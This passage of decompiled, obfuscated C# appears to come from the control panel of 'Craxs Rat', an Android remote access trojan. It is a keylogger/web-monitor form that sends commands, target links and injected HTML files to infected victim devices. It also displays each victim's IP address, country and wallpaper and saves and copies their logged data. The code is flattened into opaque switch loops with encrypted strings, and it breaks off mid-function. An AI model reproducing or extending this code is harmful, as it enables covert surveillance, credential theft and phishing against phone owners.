        switch ((num3 = (uint) ((~(-(~(-(1833048708 + 4859157) ^ -788946603 - 376920022 + 1943275850 * -916433583) - (~(1523061281 - -555161335 - -368563642) + -(92852916 ^ -948844147)) - num2) - -880786506 * -505032479) ^ -1802454046 - 95747984) * 11125051)) % 12U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Keylogger) this).Classclient.SendMessage(new object[4]
            {
              (object) ((Data._Closure\u0024__) ((Keylogger) this).Classclient).myClient,
              (object) (Craxs_Rat.sockets.Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033E70344E + str + reso.ChekLink(this.TargetLink.Text) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num4) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num5) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Keylogger) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0031D0A5126),
              (object) ((Keylogger) this).Classclient
            });
            num1 = 588364054;
            continue;
          case 1:
            CraxsAlert.ShowWarning(EXGuarder.\u003141D0225);
            num1 = 588364054;
            continue;
          case 2:
            goto label_1;
          case 3:
            int num6 = string.IsNullOrEmpty(this.TargetLink.Text) ? 1471234562 : (num6 = 1755971054);
            num1 = num6 ^ (int) num3 * -347901775;
            continue;
          case 4:
            this.statustext.Text = EXGuarder.\u0032B361C6F;
            num1 = (int) num3 * -323923362 ^ -389896452;
            continue;
          case 5:
            int num7 = Operators.CompareString(this.DrakeUIComboBox1.Text.ToLower(), EXGuarder.\u00354606237.ToLower(), false) != 0 ? -1173261671 : (num7 = -563247944);
            num1 = num7 ^ (int) num3 * -161623198;
            continue;
          case 6:
            this.statustext.Text = EXGuarder.\u0031C5F3277;
            num1 = (int) num3 * 1944650698 ^ -295848616;
            continue;
          case 7:
            str = EXGuarder.\u0030C431E28;
            num1 = 648392740;
            continue;
          case 8:
            num5 = 0;
            str = EXGuarder.\u003723B5A10;
            num1 = (int) num3 * -1195593013 ^ 1228822845;
            continue;
          case 9:
            int num8 = string.IsNullOrEmpty(this.TargetLink.Text) ? 89530946 : (num8 = -1815314208);
            num1 = num8 ^ (int) num3 * -847692433;
            continue;
          case 10:
            goto label_14;
          case 11:
            strArray = ((Data) ((Keylogger) this).Classclient).Keys.Split(':');
            num4 = 0;
            num1 = (int) num3 * -1680311446 ^ 644869902;
            continue;
          default:
            goto label_15;
        }
      }
label_14:
      return;
label_15:;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsokqautry(object sender, EventArgs e)
    {
      this.DrakeUIComboBox1.Text = EXGuarder.\u00370685071;
      try
      {
        // ISSUE: reference to a compiler-generated field
        this.ClientPic.Image = (Image) ((Data._Closure\u0024__39\u002D17) ((Keylogger) this).Classclient).Wallpaper;
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        this.clinameinfo.Text = EXGuarder.\u003011A4405 + ((Data._Closure\u0024__39\u002D12) ((Keylogger) this).Classclient).ClientName + Strings.Space(2) + EXGuarder.\u0036B3D1572 + ((Data) ((Keylogger) this).Classclient).ClientAddressIP + Strings.Space(2) + EXGuarder.\u003103D7977 + ((Data._Closure\u0024__39\u002D11) ((Keylogger) this).Classclient).Country;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.translateme();
      try
      {
        // ISSUE: reference to a compiler-generated field
        if (!Directory.Exists(((Data._Closure\u0024__39\u002D12) ((Keylogger) this).Classclient).FolderUSER + EXGuarder.\u0034E516828))
        {
label_5:
          int num1 = 748615288;
          while (true)
          {
            uint num2;
            switch ((num2 = (uint) (-(num1 * 667906175 * -719764263) - -1641754818)) % 3U)
            {
              case 1:
                // ISSUE: reference to a compiler-generated field
                Directory.CreateDirectory(((Data._Closure\u0024__39\u002D12) ((Keylogger) this).Classclient).FolderUSER + EXGuarder.\u0034E516828);
                num1 = (int) num2 * -90762143 ^ -285133;
                continue;
              case 2:
                goto label_5;
              default:
                goto label_12;
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_9:
        int num3 = -1547920393;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (-(num3 * 667906175 * -719764263) - -1641754818)) % 3U)
          {
            case 0:
              goto label_9;
            case 2:
              ProjectData.ClearProjectError();
              num3 = (int) num4 * 1238580595 ^ 194544583;
              continue;
            default:
              goto label_12;
          }
        }
      }
label_12:
      this.BWloader.RunWorkerAsync();
    }

    private void translateme()
    {
      string language = RegistryHandler.Get_Language();
label_1:
      int num1 = -1764857500;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (((~num1 ^ 1626452375 * (1189762308 + 2141105345 * (-1687306744 - 893228530))) * -2129495549 * 246551021 - (1752929221 - -853677285)) * 677887625)) % 24U)
        {
          case 0:
            this.savbtn.Text = Codes.Translate(this.savbtn.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00319726342);
            this.cpybtn.Text = Codes.Translate(this.cpybtn.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00319726342);
            num1 = (int) num2 * 581388259 ^ -1237544845;
            continue;
          case 1:
            int num3 = Operators.CompareString(language, EXGuarder.\u003493E3167, false) == 0 ? -704382855 : (num3 = 198633657);
            num1 = num3 ^ (int) num2 * -351218257;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          case 4:
            this.openbtn.Text = Codes.Translate(this.openbtn.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00348060121);
            num1 = (int) num2 * 715707624 ^ -827189320;
            continue;
          case 5:
            this.tabcontrols.TabPages[0].Text = Codes.Translate(this.tabcontrols.TabPages[0].Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00348060121);
            num1 = (int) num2 * -1757378482 ^ 1202009757;
            continue;
          case 6:
            this.selecthtmlbtn.Text = Codes.Translate(this.selecthtmlbtn.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00319726342);
            num1 = (int) num2 * 1245110544 ^ -1423265316;
            continue;
          case 7:
            int num4 = Operators.CompareString(language, EXGuarder.\u00327480E2D, false) != 0 ? -666441323 : (num4 = 299757738);
            num1 = num4 ^ (int) num2 * 402252472;
            continue;
          case 8:
            this.savbtn.Text = Codes.Translate(this.savbtn.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00348060121);
            num1 = (int) num2 * 204934188 ^ -223768507;
            continue;
          case 9:
            this.tabcontrols.TabPages[0].Text = Codes.Translate(this.tabcontrols.TabPages[0].Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00319726342);
            this.tabcontrols.TabPages[1].Text = Codes.Translate(this.tabcontrols.TabPages[1].Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00319726342);
            num1 = (int) num2 * -1130320547 ^ -293749534;
            continue;
          case 10:
            this.cpybtn.Text = Codes.Translate(this.cpybtn.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00348060121);
            num1 = (int) num2 * 1704806405 ^ 55953651;
            continue;
          case 11:
            this.Label3.Text = Codes.Translate(this.Label3.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00348060121);
            num1 = (int) num2 * -195817627 ^ -195194015;
            continue;
          case 12:
            this.tabcontrols.TabPages[1].Text = Codes.Translate(this.tabcontrols.TabPages[1].Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00348060121);
            this.tabcontrols.TabPages[2].Text = Codes.Translate(this.tabcontrols.TabPages[2].Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00348060121);
            num1 = (int) num2 * 1607747154 ^ 630871637;
            continue;
          case 13:
            this.Label3.Text = Codes.Translate(this.Label3.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00319726342);
            this.clrbtn.Text = Codes.Translate(this.clrbtn.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00319726342);
            num1 = (int) num2 * -774820133 ^ -1272218696;
            continue;
          case 14:
            this.refbtn.Text = Codes.Translate(this.refbtn.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00348060121);
            this.commndbtn.Text = Codes.Translate(this.commndbtn.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00348060121);
            this.selecthtmlbtn.Text = Codes.Translate(this.selecthtmlbtn.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00348060121);
            this.linkspanel.Text = Codes.Translate(this.linkspanel.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00348060121);
            num1 = (int) num2 * -2102713170 ^ 1110453112;
            continue;
          case 15:
            this.clrbtn.Text = Codes.Translate(this.clrbtn.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00348060121);
            num1 = (int) num2 * -1605321812 ^ -374863957;
            continue;
          case 16:
            this.tabcontrols.TabPages[2].Text = Codes.Translate(this.tabcontrols.TabPages[2].Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00319726342);
            num1 = (int) num2 * -322823407 ^ -1608923291;
            continue;
          case 17:
            this.datapanel.Text = Codes.Translate(this.datapanel.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00348060121);
            num1 = (int) num2 * 1644472159 ^ 1163630831;
            continue;
          case 18:
            num1 = (int) num2 * 385591165 ^ -1340626097;
            continue;
          case 19:
            this.Mytitle.Text = Codes.Translate(this.Mytitle.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00319726342);
            num1 = (int) num2 * 1162711407 ^ -1942219588;
            continue;
          case 20:
            this.refbtn.Text = Codes.Translate(this.refbtn.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00319726342);
            this.commndbtn.Text = Codes.Translate(this.commndbtn.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00319726342);
            this.linkspanel.Text = Codes.Translate(this.selecthtmlbtn.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00319726342);
            this.datapanel.Text = Codes.Translate(this.datapanel.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00319726342);
            num1 = (int) num2 * -1728460059 ^ -1062773139;
            continue;
          case 21:
            this.Label2.Text = Codes.Translate(this.Label2.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00348060121);
            num1 = (int) num2 * 780364815 ^ 664599361;
            continue;
          case 22:
            this.openbtn.Text = Codes.Translate(this.openbtn.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00319726342);
            this.Label2.Text = Codes.Translate(this.Label2.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00319726342);
            num1 = (int) num2 * 1050079667 ^ 173324274;
            continue;
          case 23:
            this.Mytitle.Text = Codes.Translate(this.Mytitle.Text, EXGuarder.\u0033A3A0625, EXGuarder.\u00348060121);
            num1 = -1618926813;
            continue;
          default:
            goto label_26;
        }
      }
label_3:
      return;
label_26:;
    }

    private void Vsbar_ValueChanged(object sender, EventArgs e)
    {
      try
      {
        if (this.vewimage.Image == null)
          return;
label_1:
        int num1 = 1673932098;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((-(num1 - -~876219812) ^ -2029357219 * ((1513108638 ^ -18132851) - 1705517533 * -558060998)) - -685284112 ^ -1479139347 * -1362183751) * -548881313)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              ((Keylogger) this).y = (sender as DrakeUIScrollBar).Value;
              num1 = (int) num2 * 508835602 ^ -86783675;
              continue;
            case 2:
              this.vewimage.Refresh();
              num1 = (int) num2 * -2794694 ^ 1558205708;
              continue;
            case 3:
              goto label_7;
            default:
              goto label_8;
          }
        }
label_7:
        return;
label_8:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Vewimage_Paint(object sender, PaintEventArgs e)
    {
    }

    private void BWloader_DoWork(object sender, DoWorkEventArgs e)
    {
      try
      {
        if (((Keylogger) this).Classclient == null)
          return;
label_1:
        int num1 = -1278593976;
        object[] ParametersObjects;
        string[] strArray;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 - (~-777938362 ^ -765469614 - 966116655 - -307604377 - (-714249960 - 2108521030 - (-2062392295 ^ -1507225022)) - (169499521 ^ 1290140240 * -927592731 ^ -1062450155 * -262856167 + (521891760 - 2001855327))) - (~2080853217 - (---1694068065 ^ ~(161589935 ^ -508507547))) - (910534625 * (1942122174 - 1214098854) - 847415219))) % 5U)
          {
            case 0:
              ((Keylogger) this).Classclient.SendMessage(ParametersObjects);
              num1 = (int) num2 * -1063285639 ^ -439586333;
              continue;
            case 1:
              strArray = ((Data) ((Keylogger) this).Classclient).Keys.Split(':');
              num1 = (int) num2 * -1038212982 ^ -288043784;
              continue;
            case 2:
              goto label_11;
            case 3:
              goto label_1;
            case 4:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ParametersObjects = new object[4]
              {
                (object) ((Data._Closure\u0024__) ((Keylogger) this).Classclient).myClient,
                (object) (Craxs_Rat.sockets.Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0032B687545 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Keylogger) this).Classclient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u0037658726F),
                (object) ((Keylogger) this).Classclient
              };
              num1 = (int) num2 * 666980603 ^ 160062731;
              continue;
            default:
              goto label_7;
          }
        }
label_11:
        return;
label_7:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_9:
        int num3 = -1691026614;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num3 - (~-777938362 ^ -765469614 - 966116655 - -307604377 - (-714249960 - 2108521030 - (-2062392295 ^ -1507225022)) - (169499521 ^ 1290140240 * -927592731 ^ -1062450155 * -262856167 + (521891760 - 2001855327))) - (~2080853217 - (---1694068065 ^ ~(161589935 ^ -508507547))) - (910534625 * (1942122174 - 1214098854) - 847415219))) % 3U)
          {
            case 0:
              goto label_9;
            case 1:
              goto label_3;
            case 2:
              ProjectData.ClearProjectError();
              num3 = (int) num4 * 872161058 ^ 1418474986;
              continue;
            default:
              goto label_14;
          }
        }
label_3:
        return;
label_14:;
      }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwashgys(object sender, EventArgs e)
    {
      try
      {
        OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.InitialDirectory = EXGuarder.\u00307791C16;
        openFileDialog.Title = EXGuarder.\u0035A014B41;
        openFileDialog.Filter = EXGuarder.\u00312394165;
label_1:
        int num1 = 444812375;
        object[] ParametersObjects;
        while (true)
        {
          int num2 = num1;
          uint num3;
          TcpClient client;
          string str;
          string[] strArray;
          string fileName;
          switch ((num3 = (uint) (--304709374 - -((num2 ^ ((-1286941453 ^ 2013100517 ^ 325638678) + ~-1119051675) * -1634518287 * 1080898281 ^ -1083823593 * ~-(-939683061 - 656826877)) - ((-229297041 - 439996118) * 409489263 - (348855892 - -724972224 - 366849684))))) % 9U)
          {
            case 0:
              fileName = openFileDialog.FileName;
              int num4;
              num1 = num4 = MessageBox.Show(EXGuarder.\u003070E071E, EXGuarder.\u003730C772E, MessageBoxButtons.YesNo) != DialogResult.Yes ? -835163531 : (num4 = -927359439);
              continue;
            case 1:
              goto label_5;
            case 2:
              goto label_3;
            case 3:
              goto label_1;
            case 4:
              int num5 = openFileDialog.ShowDialog() == DialogResult.OK ? 180751541 : (num5 = 1370106392);
              num1 = num5 ^ (int) num3 * -1421735154;
              continue;
            case 5:
              str = Conversions.ToString(Codes.BSEN(File.ReadAllText(fileName)));
              num1 = (int) num3 * -2030833693 ^ 1092083019;
              continue;
            case 6:
              // ISSUE: reference to a compiler-generated field
              client = ((Data._Closure\u0024__) ((Keylogger) this).Classclient).myClient;
              strArray = ((Data) ((Keylogger) this).Classclient).Keys.Split(':');
              num1 = (int) num3 * 1831571953 ^ -1209249724;
              continue;
            case 7:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ParametersObjects = new object[4]
              {
                (object) client,
                (object) (Craxs_Rat.sockets.Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00315202543 + str + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Keylogger) this).Classclient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u00326736219),
                (object) ((Keylogger) this).Classclient
              };
              num1 = (int) num3 * -1801797117 ^ 1416076943;
              continue;
            case 8:
              goto label_11;
            default:
              goto label_12;
          }
        }
label_3:
        return;
label_11:
        return;
label_12:
        return;
label_5:
        ((Keylogger) this).Classclient.SendMessage(ParametersObjects);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void WebViewMonitor_FormClosing(object sender, FormClosingEventArgs e)
    {
      if (((Keylogger) this).Classclient == null)
        goto label_6;
label_1:
      int num1 = 486047465;
label_2:
      string[] strArray;
      int num2;
      int num3;
      while (true)
      {
        uint num4;
        switch ((num4 = (uint) ((((num1 ^ -(2092328130 - 1286933663 + ((1866983049 ^ 577563890) + --1615686295) ^ -1534767987 ^ 1865848929)) * 2118065741 + -166793981 * 416409733) * 1151459761 - ~-733884498) * -1176593631)) % 12U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Keylogger) this).Classclient.SendMessage(new object[4]
            {
              (object) ((Data._Closure\u0024__) ((Keylogger) this).Classclient).myClient,
              (object) (Craxs_Rat.sockets.Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003392D6A0C + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num2) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num3) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Keylogger) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003291F1B37),
              (object) ((Keylogger) this).Classclient
            });
            num1 = 2015273927;
            continue;
          case 1:
            goto label_3;
          case 2:
            goto label_6;
          case 3:
            this.statustext.Text = EXGuarder.\u00324243D70;
            num1 = (int) num4 * -306308014 ^ 651817951;
            continue;
          case 4:
            this.statustext.Text = EXGuarder.\u003103B2044;
            num1 = (int) num4 * 210301423 ^ -1328308017;
            continue;
          case 5:
            int num5 = Operators.CompareString(this.DrakeUIComboBox1.Text.ToLower(), EXGuarder.\u0031F43656F.ToLower(), false) != 0 ? -1111743986 : (num5 = -118199188);
            num1 = num5 ^ (int) num4 * -1244016519;
            continue;
          case 6:
            num1 = (int) num4 * 389444602 ^ 1950707941;
            continue;
          case 7:
            goto label_1;
          case 8:
            strArray = ((Data) ((Keylogger) this).Classclient).Keys.Split(':');
            num1 = (int) num4 * -984461283 ^ -603737872;
            continue;
          case 9:
            num2 = 0;
            num3 = 0;
            num1 = (int) num4 * 1778047829 ^ 1029134535;
            continue;
          case 10:
            string str1 = EXGuarder.\u003335A012C;
            num1 = 1579525806;
            continue;
          case 11:
            string str2 = EXGuarder.\u0033F5C3723;
            num1 = (int) num4 * 2117265819 ^ -1544162263;
            continue;
          default:
            goto label_14;
        }
      }
label_3:
      return;
label_14:
      return;
label_6:
      this.BWloader.Dispose();
      num1 = -1078036208;
      goto label_2;
    }

    private void Timeloader_Tick(object sender, EventArgs e)
    {
    }

    private void Namescombo_SelectedIndexChanged(object sender, EventArgs e)
    {
      try
      {
        if (string.IsNullOrEmpty(this.namescombo.Text))
          return;
label_1:
        int num1 = 1662600455;
        string str1;
        string str2;
        string str3;
        string[] strArray;
        string text;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (--(-num1 * 1359830821) * -1291107325 ^ -1618228497)) % 9U)
          {
            case 0:
              goto label_1;
            case 1:
              this.linktext.Text = str2;
              this.idtext.Text = str3;
              num1 = (int) num2 * -1345253428 ^ -1004827593;
              continue;
            case 2:
              int num3 = str1 == null ? 1421266723 : (num3 = 1754713514);
              num1 = num3 ^ (int) num2 * -915904026;
              continue;
            case 3:
              goto label_12;
            case 4:
              this.nametext.Text = text;
              num1 = (int) num2 * -1992577723 ^ -1102559910;
              continue;
            case 5:
              strArray = str1.Split(':');
              text = this.namescombo.Text;
              num1 = (int) num2 * -319875162 ^ 2053153891;
              continue;
            case 6:
              str1 = ((Keylogger) this).MapData[this.namescombo.Text];
              num1 = (int) num2 * 1059075598 ^ 1580403567;
              continue;
            case 7:
              int num4 = !str1.Contains(EXGuarder.\u0032F774F25) ? 465864777 : (num4 = -1143681866);
              num1 = num4 ^ (int) num2 * 703776290;
              continue;
            case 8:
              str2 = strArray[0];
              str3 = strArray[1];
              num1 = (int) num2 * -1598189394 ^ -626215471;
              continue;
            default:
              goto label_13;
          }
        }
label_12:
        return;
label_13:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void DrakeUIButtonIcon7_Click(object sender, EventArgs e)
    {
      if (this.BWloader.IsBusy)
        return;
label_1:
      int num1 = 801520677;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (--((num1 ^ -((913005237 - -2118057944) * 1319244771) * 1710837175 ^ ~((659112548 - 1110542793) * 1084618357 ^ -1562738037 * 1426217575)) * -1573239167 + (~(439985332 ^ 326691646) - (1253381994 - 1192030593 + 813862025))) - 2128937931)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.BWloader.RunWorkerAsync();
            num1 = (int) num2 * 1164474772 ^ 49244347;
            continue;
          case 2:
            goto label_5;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
    {
      this.datalogtext.Text = EXGuarder.\u003086D1D11;
    }

    private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
    {
      if (string.IsNullOrEmpty(this.datalogtext.Text))
        return;
label_1:
      int num1 = -1256104663;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) --(~num1 - -(-689734766 ^ -1466021954 ^ -105757131) * 1836935231 + (-90585253 * 366555249 ^ 933950343 - -48798074 ^ -162120341 * ~-1965334038) ^ -(487469434 - 1043391058))) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_6;
          case 2:
            Clipboard.SetText(this.datalogtext.Text);
            num1 = (int) num2 * -200467932 ^ 649737208;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated method
            AsyncLock.VB\u0024StateMachine_2_LockAsync.ShowSucess(EXGuarder.\u00369142E1A);
            num1 = (int) num2 * -780140267 ^ -1275611691;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void DrakeUIButtonIcon9_Click(object sender, EventArgs e)
    {
      // ISSUE: reference to a compiler-generated field
      if (Directory.Exists(((Data._Closure\u0024__39\u002D12) ((Keylogger) this).Classclient).FolderUSER + EXGuarder.\u0036F375569))
        goto label_5;
label_1:
      int num1 = -28232668;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-((num1 ^ -(--791366017 ^ ~2092098328 ^ ~~806893510) - ((~-1544438347 - (1534514026 + 1823987625) ^ ~(-370153849 * 650573219)) + (~~791727639 ^ -730983565))) * 1003294367 ^ -448960810 - 2140285348 ^ ~-125263614 + (-945573016 - -1666364995)) ^ -2127341360 - 1350565684) * -1390567427)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            CraxsAlert.Showinformation(EXGuarder.\u0037074416B);
            num1 = (int) num2 * -900934898 ^ -1005592007;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_5;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      return;
label_5:
      // ISSUE: reference to a compiler-generated field
      Process.Start(((Data._Closure\u0024__39\u002D12) ((Keylogger) this).Classclient).FolderUSER + EXGuarder.\u0036F375569);
      num1 = 1548613063;
      goto label_2;
    }

    private void DrakeUIButtonIcon6_Click(object sender, EventArgs e)
    {
      string lower = this.comandcombo.Text.ToLower();
label_1:
      int num1 = -693509075;
      string[] strArray1;
      string text1;
      string text2;
      string text3;
      string str1;
      string text4;
      string text5;
      string text6;
      string str2;
      string text7;
      string[] strArray2;
      object[] ParametersObjects;
      string text8;
      string[] strArray3;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-~(-(num1 - ((~--740923570 ^ ~73960597 - (2102600979 ^ 1624103764)) * 1314241295 + (-(-690394433 - -1101697001) + ~-5331915 + (~(-969702910 - -1243119018) ^ -1801991562 ^ 1418790456 * 465151771)))) - 1536697209) - 102541952)) % 38U)
        {
          case 0:
            text6 = this.idtext.Text;
            num1 = (int) num2 * 1926619234 ^ -474272743;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Data._Closure\u0024__) ((Keylogger) this).Classclient).myClient,
              (object) (Craxs_Rat.sockets.Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031B3E070B + text7 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray2[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray2[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Keylogger) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00320482769),
              (object) ((Keylogger) this).Classclient
            };
            num1 = (int) num2 * 690703243 ^ 1680211558;
            continue;
          case 2:
            str2 = text4 + EXGuarder.\u003014C0174 + text5 + EXGuarder.\u003014C0174 + text6 + EXGuarder.\u003014C0174;
            num1 = 253178588;
            continue;
          case 3:
            text4 = this.nametext.Text;
            num1 = -158505332;
            continue;
          case 4:
